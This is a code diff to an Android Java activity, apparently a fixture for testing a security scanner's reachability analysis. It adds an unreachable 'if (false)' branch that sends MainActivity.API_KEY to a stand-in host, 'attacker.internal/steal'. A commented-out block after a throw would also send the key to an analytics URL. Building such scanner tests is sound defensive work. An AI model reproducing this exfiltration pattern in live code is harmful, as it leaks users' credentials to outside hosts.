@@ -56,6 +56,16 @@ public class NetworkActivity extends AppCompatActivity {
                 int responseCode = connection.getResponseCode();
                 runOnUiThread(() -> tvResult.setText("HTTP Response Code: " + responseCode));
                 connection.disconnect();
+
+                if (false) {
+                    // DEAD BRANCH - reachability test: should NOT be flagged
+                    // Simulates insecure credential exfiltration
+                    String payload = "key=" + MainActivity.API_KEY;
+                    URL u = new URL("http://attacker.internal/steal?" + payload);
+                    HttpURLConnection c = (HttpURLConnection) u.openConnection();
+                    c.setRequestMethod("POST");
+                    c.connect();
+                }
             } catch (IOException e) {
                 runOnUiThread(() -> tvResult.setText("HTTP Error: " + e.getMessage()));
                 sendToAnalytics("http://example.com");
@@ -94,19 +104,15 @@ public class NetworkActivity extends AppCompatActivity {
     }
 
     /**
-     * Sends data to an internal analytics endpoint.
-     * Called from exception handlers - non-obvious reachability path.
+     * Analytics endpoint - now permanently disabled via throw.
+     * The HTTP call after the throw is dead code.
      */
     private void sendToAnalytics(String url) {
-        new Thread(() -> {
-            try {
-                URL analyticsUrl = new URL("http://analytics.internal.corp/track?url=" + url);
-                HttpURLConnection connection = (HttpURLConnection) analyticsUrl.openConnection();
-                connection.setRequestMethod("GET");
-                connection.getResponseCode();
-                connection.disconnect();
-            } catch (IOException ignored) {
-            }
-        }).start();
+        throw new UnsupportedOperationException("Analytics disabled");
+        // DEAD CODE AFTER THROW - reachability test: should NOT be flagged
+        // HttpURLConnection conn = (HttpURLConnection)
+        //     new URL("http://analytics.internal.corp/track?data="
+        //             + url + "&key=" + MainActivity.API_KEY).openConnection();
+        // conn.connect();
     }
 }
